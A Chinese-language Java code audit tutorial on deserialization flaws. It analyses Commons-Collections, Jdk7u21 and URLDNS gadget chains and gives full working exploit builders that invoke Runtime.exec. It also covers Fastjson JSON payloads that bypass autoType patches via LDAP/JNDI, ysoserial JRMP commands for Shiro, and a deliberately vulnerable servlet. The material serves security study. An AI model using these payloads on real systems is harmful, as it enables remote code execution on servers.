# Java代码审计-反序列化


## 0x00 漏洞挖掘

### 业务代码

简单来说，找`readObject/readUnshared`就好了

```java
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
    String baseStr = request.getParameter("str");
    byte[] decodeStr = Base64.getDecoder().decode(baseStr);
    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decodeStr);
    ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
    try {
      Object object = objectInputStream.readObject();
      //response.getWriter().println(object);
    } catch (ClassNotFoundException e) {
      e.printStackTrace();
    } finally {
      objectInputStream.close();
      response.getWriter().println("Unser Test");
    }
}
```

还有其它用于解析的类库（xml、yml、json等），由于java一切皆对象的特性，反序列化如果处理不当都会存在问题：

```java
XMLDecoder.readObject
Yaml.load
XStream.fromXML
ObjectMapper.readValue
JSON.parseObject
```

### 利用链

利用链通常分为三部分，触发点、中继点、执行点。

#### 触发点

触发点比较简单，主要是`readObj`

#### 中继点

* 动态代理

  相关知识可参考[Java动态代理](https://juejin.im/post/5ad3e6b36fb9a028ba1fee6a)。

  要实现动态代理需要有三个类：

  1. 委托类

     委托类就是处理业务逻辑的类，动态代理的目的就是在委托类中的代码运行时插入其他的操作，如日志打印。此外，委托类必须实现某个接口。

  2. 中介类

     中介类是对`InvocationHandler`接口的实现，它持有一个委托类对象的引用，在代理类调用相关方法时，会劫持到中介类的`invoke`方法中，在插入操作后，通过反射调用委托类的方法。

  3. 代理类

     代理类通过`Proxy.newProxyInstance`来创建，返回类型是委托类所实现的接口的类型。其他类会调用代理类来获取相应的功能，委托类是透明的。

* java字节码

   `ClassLoader.defineClass()` 方法运行后，**并不会执行 static block**，而 `Class.newInstance()` 会执行。


#### 执行点

反序列化利用链的挖掘比较困难的点是反序列化执行点，有了反序列化执行点，一般情况下都可以挖掘出不止一条的利用连。**所以反序列化执行点应该是整个利用链首先关注的。**

常见执行命令的方式：

- 反射利用`Runtime.getRuntime().exec`或`java.lang.ProcessBuilder`执行
- JNDI远程调用
- Templates执行字节码
- EL表达式
- 其他可执行命令的接口

## 0x01 示例分析

###commons-collentions

这里以经典的commons-collentions进行分析，首先找到利用点，然后逆推出整个利用链。

`commons-collections-3.1.jar!/org/apache/commons/collections/functors/InvokerTransformer.class`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190811001454.png)

首先是`InvokerTransformer`中的`transform`方法中会将传入的object用反射进行调用。

`commons-collections-3.1.jar!/org/apache/commons/collections/functors/ChainedTransformer.class`

![img](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190811002037.png)

接下来寻找哪里可以调用这个方法，`ChainedTransformer`中的`transform`方法会将`iTransformers`这个类变量进行遍历，调用每个成员的`transform`方法，并将方法返回的结果放入object中，形成一个链式调用。

#### jdk1.8

网上比较老的文章大多是寻找jdk1.7中的类进行利用，然而时代在发展，jdk1.8才是目前最常见的版本，jdk1.7中的类也不再适用。

`commons-collections-3.1.jar!/org/apache/commons/collections/map/LazyMap.class`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190811005403.png)

继续寻找可调用的地方，在`LazyMap`的`get`方法中调用了`factory`变量的transform方法。

`commons-collections-3.1.jar!/org/apache/commons/collections/keyvalue/TiedMapEntry.class`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190811010119.png)

`TiedMapEntry`类的`toString`和`hasCode`方法都会调用`getValue`这个方法，而`getValue`中调用了`map`的`get`方法。

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190811005918.png)

现在我们的目标变成了如何触发`TiedMapEntry`类的`toString`方法。

`jdk1.8.0_191.jdk/Contents/Home/src.zip!/javax/management/BadAttributeValueExpException.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190811010538.png)

在jdk1.8中存在`BadAttributeValueExpException`这个类，它的`readObj`方法中直接调用了`valObj`的`toString`方法，`valObj`是当前对象的 val 属性，一个完美的“入口”。

在找到一条pop链之后，下一步的任务就是构造exp，由于对java不是很熟，中间可能会穿插一部分基础知识。

```java
public class UnserTest {
    public BadAttributeValueExpException getObject(String command) throws NoSuchFieldException, IllegalAccessException {
        Transformer[] transformers = new Transformer[] {
					//这里是重点
        };
      
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        Map toolMap = new HashMap(); //工具人map，没什么用
        Map lazyMap = LazyMap.decorate(toolMap, chainedTransformer); //lazyMap的构造方法为protected，无法直接调用
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "toolsKey"); //key可以是任意字符串，无影响

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); //入口
        //val是私用变量，不能用.val直接修改
        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(badAttributeValueExpException, tiedMapEntry);

        return badAttributeValueExpException;
    }

    public static void main(String[] args) throws Exception {
        BadAttributeValueExpException object = getObject("touch /tmp/success");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object); //
        objectOutputStream.flush();
        objectOutputStream.close();

        String encodeStr = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        //System.out.println(byteArrayOutputStream.toString());
        System.out.println(encodeStr);
    }
}
```

通过pop链，将exp的框架构造出来了，exp的核心就是构造transforms数组，进行反射调用。我们的最终目的就是执行`Runtime.getRuntime().exec()`，但是java是一门静态语言，需要利用反射去赋予它一些动态的特性。

```java
Class<?> runtimeClass = Class.forName("java.lang.Runtime"); //一切皆对象，类也是一个对象

Method getRuntime = runtimeClass.getMethod("getRuntime", null); //获取getRuntime方法
Runtime runtimeObj = (Runtime) getRuntime.invoke(null, null); //调用getRuntime方法获取Runtime类的实例化对象
runtimeObj.exec("touch /tmp/success"); //调用exec方法
```

接下来根据反射构造transforms：

首先我们需要获取Runtime对应的类，这里我们使用：

`commons-collections-3.1.jar!/org/apache/commons/collections/functors/ConstantTransformer.class`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190814233339.png)

这个类的`transform`方法会将传入的对象原样返回：

```java
Transformer[] transformers = new Transformer[] {
		new ConstantTransformer(Runtime.class),
    new InvokerTransformer(
      	"getMethod",
        new Class[]{String.class, Class[].class}, //getMethod方法的参数的类型
        new Object[]{"getRuntime", null} //调用getMethod方法时要传的参数
    ), //返回java.lang.Runtime.getRuntime()
    new InvokerTransformer(
        "invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, null}
    ), //返回一个Runtime对象
    new InvokerTransformer(
        "exec",
        new Class[]{String.class},
        new String[]{command} //转化为字符串数组
    )
};
```

> 也有同学可能看过ysoserial构造的Payload，它的习惯是先定义一个包含『无效』`Transformer`的`ChainedTransformer`，等所有对象装填完毕之后再利用反射将实际的数组放进去。这么做的原因作者也在一个Issue中给了解释，我们直接看原文：
>
> > Generally any reflection at the end of gadget-chain set up is done to "arm" the chain because constructing it while armed can result in premature "detonation" during set-up and cause it to be inert when serialized and deserialized by the target application.

#### jdk1.7

1.7的不说一下似乎也不太合适～

`commons-collections-3.1.jar!/org/apache/commons/collections/map/TransformedMap.class`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190925174249.png)

在`TransformedMap`的`checkSetValue`方法中调用了`transform`方法。

`commons-collections-3.1.jar!/org/apache/commons/collections/map/AbstractInputCheckedMapDecorator.class`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190925175059.png)

在内部类`MapEntry`中的`setValue`方法中调用了`checkSetValue`。

`jdk1.7.0_21.jdk/Contents/Home/jre/lib/rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190925180533.png)

在jdk1.7中找到了这样一个入口点，我们需要保证`var5`即`.entrySet().iterator().next()`返回的对象是`org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry`的实例化。

`commons-collections-3.1.jar!/org/apache/commons/collections/map/AbstractInputCheckedMapDecorator.class`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190925181308.png)

首先是next。

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190925181439.png)

然后是iterator。

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190925192012.png)

最后是entrySet。

在找到整条利用链之后，就可以构造exp了。

```java
public static Object getObject(String command) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
  Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(
      "getMethod",
      new Class[]{String.class, Class[].class}, //getMethod方法的参数的类型
      new Object[]{"getRuntime", new Class[0]} //调用getMethod方法时要传的参数
    ), //返回java.lang.Runtime.getRuntime()
    new InvokerTransformer(
      "invoke",
      new Class[]{Object.class, Object[].class},
      new Object[]{null, new Object[0]}
    ), //返回一个Runtime对象
    new InvokerTransformer(
      "exec",
      new Class[]{String.class},
      new Object[]{command} //转化为字符串数组
    )
  };
  Transformer chainedTransformer = new ChainedTransformer(transformers);

  Map map = new HashMap();
  map.put("value", "avalue"); //key的值必须是value
  Map transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

  Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); //类无法直接声明，需要反射调用
  Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
  constructor.setAccessible(true);
  Object object = constructor.newInstance(Target.class, transformedMap);
  return object;
}
```

看[ysoserial_CommonsCollection1](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java)并不是使用上述exp，而是使用动态代理的方式来触发。

我们发现`jdk1.7.0_21.jdk/Contents/Home/jre/lib/rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class`本身就是一个中介类：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190926161423.png)

在它的`invoke`调用了`get`方法：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190926161519.png)

这就跟jdk1.8的exp有点相似了：

`commons-collections-3.1.jar!/org/apache/commons/collections/map/LazyMap.class`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190811005403.png)

exp如下：

```java
public static Object getObject(String command) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
    Transformer[] transformers = new Transformer[] {
      //......    
    };
    Transformer chainedTransformer = new ChainedTransformer(transformers);

    Map map = new HashMap();
    Map lazyMap = LazyMap.decorate(map, chainedTransformer);

    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); //类无法直接声明，需要反射调用
    Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
    constructor.setAccessible(true);

    InvocationHandler ih = (InvocationHandler) constructor.newInstance(Target.class, lazyMap); //实例化中介类
    Map mapProxy = (Map) Proxy.newProxyInstance(CommonCollection1.class.getClassLoader(), new Class[] {CommonCollection1.class}, ih); //实例化代理类
    Object object = constructor.newInstance(Target.class, mapProxy); //这里是生成序列化使用的对象，注意与上面区分
    return object;
}
```

### JDK

#### Jdk7u21

还是从利用点逆推的方式进行分析。

漏洞利用的点在`jdk1.7.0_21.jdk/Contents/Home/src.zip!/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java`的`defineTransletClasses`方法中：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190927210425.png)

> defineClass() 是将你定义的字节码文件经过字节数组流解密之后，将该字节流数组生成字节码文件，也就是该类的文件的类名.class。通常用在重写findClass中，返回一个Class。**如果不想要把class加载到jvm中，也可以单独使用getConstructor和newInstance来实例化一个对象。**

通过设置`_bytecodes`就可以加载指定的class，后面两处是构造payload需要注意的地方。

下面来寻找调用defineClass的方法，在`getTransletInstance`方法中调用了`defineTransletClasses`方法，并在下面调用了`newInstance`。

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190927142213.png)

然后在`newTransformer`中调用了`getTransletInstance`方法：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190927144940.png)

现在我们的目标变成了调用`newTransformer`方法：

在`jdk1.7.0_21.jdk/Contents/Home/jre/lib/rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class`的`equalImpl`方法中：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190927150203.png)

首先获取`type`（`AnnotationInvocationHandler`类的成员变量）的所有方法，然后通过反射将传入参数var1的对应方法循环调用一遍。

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190927152051.png)

在`invoke`方法中，如果符合条件，就会调用`equalImpl`方法。

`AnnotationInvocationHandler`是动态代理中的一个中介类，当代理类调用方法时会进入`invoke`方法。

根据上述代码，我们需要调用`equals`方法。

在`jdk1.7.0_21.jdk/Contents/Home/src.zip!/java/util/HashMap.java`的put方法中：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190927154623.png)

由于set的特性（元素没有重复），这个方法的功能是在传入新的Entry时，会和上一个 Entry 的 Key (templates) 进行比较，判断这两个对象是否相等，如果相等则新的替换老的值，然后返回老的值。

如果我们想要利用这个漏洞，就需要向map中传两个Entry，结合代码来说，就是k（e.key）是构造好的恶意对象，key是代理对象，在调用equals方法时将恶意对象进一步传递。

在执行`key.equals`之前，需要满足两个条件：

```
e.hash == hash
e.key != key
```

来看一下hash如何生成的：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190927182722.png)

可以看到，对hash结果有影响的只有`k.hashCode()`，对于普通对象来说，`k.hashCode()`会直接返回；对于代理类的对象，会进入`invoke`方法，增加其他操作：

`jdk1.7.0_21.jdk/Contents/Home/jre/lib/rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190927183035.png)

继续跟进：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190927183154.png)

这里会遍历中介类的`memberValues`属性，对它们的key、value按照一定规则运算然后相加，就得到了代理类的hash，运算规则是：

```
127 * (var3.getKey().hashCode() ^ memberValueHashCode(var3.getValue())
```

如果`var3.getKey().hashCode()`为0，那么hash就是`memberValueHashCode(var3.getValue())`的值。

跟进`memberValueHashCode`方法：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190927183557.png)

如果value不是数组，那么直接返回value的hashcode。

综上，能够调用到`equals`方法的条件是，将代理类的`memberValues`设置为只有一个Entry的map，key.hashCode为0，value为恶意类。

最后在`jdk1.7.0_21.jdk/Contents/Home/src.zip!/java/util/HashSet.java`的`readObject`方法中调用了`put`方法：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190927155101.png)

到这里整个利用链就梳理完了，构造exp如下：

```java
public static Object getObject(String command) throws Exception {
    //操作字节码构造恶意类
    ClassPool classPool = ClassPool.getDefault();
    classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
    CtClass ctClass = classPool.getCtClass(Jdk7u21.class.getName());
    String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
      command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
      "\");";
    ctClass.makeClassInitializer().insertBefore(cmd);
    ctClass.setName("EvilClass" + System.nanoTime());
    ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
    byte[][] _bytecodes = new byte[][]{ctClass.toBytecode()}; //获取字节码

    TemplatesImpl templates = TemplatesImpl.class.newInstance();
    Reflections.setFieldValue(templates, "_bytecodes", _bytecodes);
    Reflections.setFieldValue(templates, "_name", "Necessary" + System.nanoTime()); //_name不为null即可

    Map map = new HashMap();
    //f5a5a608是一个神奇的字符串，它的hashCode为0；
    //value是恶意类，保证与上一个传入的value的hashCode相同
    //但是这里先放入一个随机值，等所有类声明完毕之后再替换为恶意类
    //这样做的目的是防止利用链提前触发而导致生成的payload失效
    //可以做一个实验，如果这里是map.put("f5a5a608", templates);，那么在序列化的过程中命令就会执行
    map.put("f5a5a608", "foo");

    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); //中介类无法直接声明，需要反射调用
    Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
    constructor.setAccessible(true);

    InvocationHandler ih = (InvocationHandler) constructor.newInstance(Target.class, map); //实例化中介类
    Reflections.setFieldValue(ih, "type", Templates.class); //equalImpl中获取type属性的所有方法并调用
    Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[] {Templates.class}, ih); //实例化代理类

    LinkedHashSet linkedHashSet = new LinkedHashSet(); //必须使用LinkedHashSet，否则传入的元素顺序会乱
    linkedHashSet.add(templates); //先放恶意类
    linkedHashSet.add(proxy); //再放代理类
  	map.put("f5a5a608", templates); //将真正的恶意类放入map中
    return linkedHashSet;
}
```

使用了ysoserial的反射工具类，代码看起来简洁一点。

#### JRE8u20

[深度 - Java 反序列化 Payload 之 JRE8u20](https://xz.aliyun.com/t/1620)

#### URLDNS

这条利用链也是在jdk中，不需要其他第三方库。这条链的作用是发送dns请求，在验证反序列化漏洞是否存在时非常方便，同时调用也比较简单，这里简单说一下。需要注意的是Java默认有TTL缓存，DNS解析会进行缓存（默认10s），所以可能会出现第一次收到DNS的log，后面可能收不到的情况。

首先在`jdk1.7.0_21.jdk/Contents/Home/src.zip!/java/net/URLStreamHandler.java`中的hashCode方法中，会调用`getHostAddress`方法尝试获取url对应的ip，这里就会发送dns请求，可以使用dns平台接收。

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190929182056.png)

`jdk1.7.0_21.jdk/Contents/Home/src.zip!/java/net/URL.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190929183204.png)

这里需要保证`hashCode`为-1。

`jdk1.7.0_21.jdk/Contents/Home/src.zip!/java/util/HashMap.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190929183401.png)

hashmap会用Entry的key来计算hash。

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190929184201.png)

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190929184328.png)

最后在Hashmap的readObjet方法中触发。

### Fastjson

由于是fastjson是一个json的解析库，所以触发点在解析json的地方：

```java
JSON.parseObject(jsonString, Object.class, config, Feature.SupportNonPublicField);
JSON.parse(jsonString, Feature.SupportNonPublicField); //比较常见的写法
```

需要注意的是`Feature.SupportNonPublicField`这个参数，该字段在**fastjson 1.2.22**版本引入，设置之后才可以反序列化对象的私有属性。

先来看exp：

```java
public static String getJsonString(String command) throws CannotCompileException, NotFoundException, IOException {
  	//构造恶意类
    ClassPool classPool = ClassPool.getDefault();
    classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
    CtClass ctClass = classPool.getCtClass(FastJson.class.getName());
    String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
      command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
      "\");";
    ctClass.makeClassInitializer().insertBefore(cmd);
    ctClass.setName("EvilClass" + System.nanoTime());
    ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
    String evilCode = Base64.encodeBase64String(ctClass.toBytecode()); //获取字节码

    final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
    return "{\"@type\":\"" + NASTY_CLASS +
      "\",\"_bytecodes\":[\""+evilCode+"\"]," + //这里注意_bytecodes是一个数组
      "'_name':'necessary'," + //在读取字节码前会有一个判断，不为空即可
      "'_tfactory':{}," + //某些jdk版本如果没有设置会报错
      "\"_outputProperties\":{}}\n"; //触发getOutputProperties方法
}
```

利用点用的是上面提到的jdk7u21：

`jdk1.7.0_21.jdk/Contents/Home/src.zip!/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java`的`defineTransletClasses`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20190927144940.png)

在分析调用链之前，首先需要了解fastjson的一些特性。

```java
Person person = new Person();
person.name = "blue";
person.length = 18;

String s = JSONObject.toJSONString(person);
String s1 = JSONObject.toJSONString(person, SerializerFeature.WriteClassName);

System.out.println(s);
System.out.println(s1);

Object parse = JSON.parse(s);
Object parse1 = JSON.parse(s1);

System.out.println("type:"+ parse.getClass().getName() +" "+parse);
System.out.println("type:"+ parse1.getClass().getName() +" "+parse1);

//output
/*
{"length":18,"name":"blue"}
{"@type":"simple.Person","length":18,"name":"blue"}
type:com.alibaba.fastjson.JSONObject {"name":"blue","length":18}
type:simple.Person Person{name='blue', length=18}
*/
```

可以看到如果在序列化的时候设置了`SerializerFeature.WriteClassName`，得到的json字符串会有一个`@type`属性，用于指定反序列化的类。

同时fastjson在解析json时，会调用对应类的无参构造函数、setter、getter，并且调用getter是有一定条件的：

`fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/util/JavaBeanInfo.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191022183903.png)

- 只有`getter`没有`setter`
- 函数名称大于等于4
- 非静态函数
- 函数名称以get起始，且第四个字符为大写字母
- 函数没有入参
- 继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong

满足条件之后会将属性和getter关联起来，放到list中。因此我们要在`jdk1.7.0_21.jdk/Contents/Home/src.zip!/com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java`这个类中寻找符合条件的getter方法：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191022203244.png)

接下来fastjson会解析传入json字符串的属性，并在前面提到的list中寻找对应的方法，值得注意的是在`smartMatch`这个中，如果尝试匹配属性失败，会将属性中的`_`等字符去掉：

`fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191022211940.png)

所以在payload中我们提交了`_outputProperties`属性仍然可以调用`getOutputProperties`方法。另外FastJson提取byte[]数组字段值时会进行Base64解码：

`fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/serializer/ObjectArrayCodec.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191023105001.png)

`fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/parser/JSONScanner.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191023105218.png)

所以我们提交的`_bytecodes`属性的内容需要base64encode。


#### jndi

从前面的复现过程中可以看到，由于需要设置`Feature.SupportNonPublicField`，将漏洞的利用范围限制的非常小，同时开发者也不会特意去设置这个值，那有什么通用的方法吗？

答案就是jndi，下面这个图可以比较明确的说明jndi、rmi、ldap等等这些常见名词的关系：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/jndiarch.gif)

这种方式的核心就是控制应用去调用我们建立的远程恶意服务。

两个比较方便的工具：

[https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)	可以快速启动rmi/ldap server

[https://github.com/c0ny1/FastjsonExploit](https://github.com/c0ny1/FastjsonExploit)	专门针对fastjson的exp框架

比较深入的分析：

[https://kingx.me/Exploit-Java-Deserialization-with-RMI.html](https://kingx.me/Exploit-Java-Deserialization-with-RMI.html)

需要注意的是这种利用方式是有版本限制的：

- 基于rmi的利用方式：适用jdk版本：`JDK 6u132`, `JDK 7u122`, `JDK 8u113`之前。
- 基于ldap的利用方式：适用jdk版本：`JDK 11.0.1`、`8u191`、`7u201`、`6u211`之前。

高版本的绕过可以看这篇文章：[https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html](https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html)

对于rmi，jdk的防御措施是在`jdk1.8.0_191.jdk/Contents/Home/jre/lib/rt.jar!/com/sun/jndi/rmi/registry/RegistryContext.class`增加了检查：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20200225002407.png)

这里`trustURLCodebase`默认为false，如果想要正常执行`getObjectInstance`，就要让`getFactoryClassLocation`返回空。这里我们需要找一个classpath中已经存在的类来达到目的。

具体可参考[[浅析JNDI注入Bypass](https://www.cnblogs.com/Welk1n/p/11066397.html)](https://www.cnblogs.com/Welk1n/p/11066397.html)。

对于ldap，虽然我们不能返回codebase了，但是可以直接返回序列化数据，这就要求我们知道目标使用的库的gadget，利用难度上升了不少。

#### 补丁绕过

##### 1.2.25-1.2.41

在1.2.24出现漏洞之后，官方增加了一些防御措施。

首先是默认关闭了`autoType`，这次绕过也是建立在开启`autoType`的前提之下。

在加载类的时候会进行黑白名单的检测：

`fastjson-1.2.25-sources.jar!/com/alibaba/fastjson/parser/ParserConfig.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191024213552.png)

黑名单为官方维护，白名单由开发者自行维护：

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191024213719.png)

问题出在检测之后加载类的时候：

`fastjson-1.2.25-sources.jar!/com/alibaba/fastjson/util/TypeUtils.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191025105743.png)

如果类名是`L`开头，`;`结尾，会将这两个字符去掉。在进行黑名单检测的时候使用的`startWith`，所以我们提交

```json
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://127.0.0.1:1099/Exploit","autoCommit":true}
```

即可绕过类名检测。

##### 1.2.42

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191025111225.png)

一个无效的补丁，如果类名是`L`开头，`;`结尾，会将这两个字符去掉，然后再检测，那再加一层`L;`不就好了。

```json
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://127.0.0.1:1099/Exploit","autoCommit":true}
```

另外值得注意的一点是fastjson将黑名单变为了hash，增加漏洞挖掘的难度。

可以通过遍历的方式获得黑名单的明文：

[https://github.com/LeadroyaL/fastjson-blacklist](https://github.com/LeadroyaL/fastjson-blacklist)

##### 1.2.43

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191025112811.png)

简单粗暴的修补，类名开头如果是`LL`直接抛异常。

##### 1.2.47

前面几个绕过都是在`autoType`开启的前提下，然而`autoType`默认是关闭的，绕过`autoType`也成为了攻击fastjson最核心也是最困难的部分。

这次漏洞是通过java.lang.Class，将JdbcRowSetImpl类加载到map缓存，从而绕过autotype的检测。

payload：

```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1099/Exploit","autoCommit":true}}}
```

首先还是`checkAutoType`：

`fastjson-1.2.47-sources.jar!/com/alibaba/fastjson/parser/ParserConfig.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191025162647.png)

如果`autoType`是关闭的，可以看到并没有进行黑名单的检测。首先会尝试从一个map（缓存）中获取`@type`参数对应的class，如果没有就调用`findClass`方法。

`fastjson-1.2.47-sources.jar!/com/alibaba/fastjson/serializer/MiscCodec.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191025164424.png)

之后会尝试取`val`属性的值，这里我们设置为了`com.sun.rowset.JdbcRowSetImpl`。

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191025164935.png)

接下来，如果`@type`的值为`Class`时，会将`strVal`传入`loadClass`方法：

`fastjson-1.2.47-sources.jar!/com/alibaba/fastjson/util/TypeUtils.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191025165253.png)

如果缓存开启，会将这个类放入map中，这样我们需要使用的恶意类就绕过了过滤放入了运行的context中。

通过前面我们知道，当进行第二步解析调用时，会尝试调用`getClassFromMapping`方法，这时`com.sun.rowset.JdbcRowSetImpl`已经在里面了。

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191025170950.png)

##### 1.2.48

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191025171555.png)

fastjson官方修漏洞向来简单粗暴，把缓存设置为默认关闭，完事。。。

### shiro

仅仅靠shiro中的依赖并没有合适的gadget，利用是需要依靠整个项目中的其他依赖，这里记录一下坑点吧。

首先在环境搭建上，由于shiro 1.2.4版本比较老，依赖jdk1.6。

mac上的jdk1.6 java官网上没有，需要到apple官网上下载[https://support.apple.com/kb/DL1572?locale=zh_CN](https://support.apple.com/kb/DL1572?locale=zh_CN)

同时推荐一个java多版本管理工具[https://github.com/jenv/jenv](https://github.com/jenv/jenv)。

其次在动态调试的时候，需要对`shiro/samples/web/pom.xml`进行一些修改：

```xml
<!--  添加 -->
<properties>
    <maven.compiler.source>1.8</maven.compiler.source>
    <maven.compiler.target>1.8</maven.compiler.target>
</properties>

<!--  修改 -->
<dependency>
    <groupId>javax.servlet</groupId>
    <artifactId>jstl</artifactId>
    <!--  这里需要将jstl设置为1.2，否则会报错 -->
    <version>1.2</version> 
    <scope>runtime</scope>
</dependency>
```

之后将项目导入idea，配置tomcat local server就可以了。

在编译的时候也会报错，需要在`~/.m2/`新建`toolchains.xml`，内容如下：

```xml
<?xml version="1.0" encoding="UTF8"?>
<toolchains>
  <toolchain>
    <type>jdk</type>
    <provides>
      <version>1.6</version>
      <vendor>sun</vendor>
    </provides>
    <configuration>
       <jdkHome>/Library/Java/JavaVirtualMachines/1.6.0.jdk/Contents/Home</jdkHome>
    </configuration>
  </toolchain>
</toolchains>
```

最后是漏洞利用的一些坑点：

shiro自带的commons-collections的版本是3.2.1，直接使用ysoserial中的payload会报错，原因是：

> Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。

解决这种问题方是使用JRMP，利用链中没有使用数组，但是我本地测试没有成功。

```
java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.JRMPListener 9527 CommonsCollections5 "open -a calculator"

java -jar ysoserial-master-30099844c6-1.jar JRMPClient 127.0.0.1:9527
```

最后的最后来看一下代码：

`shiro-core-1.2.4-sources.jar!/org/apache/shiro/mgt/AbstractRememberMeManager.java`

![](https://mdpicture.oss-cn-beijing.aliyuncs.com/20191028210834.png)



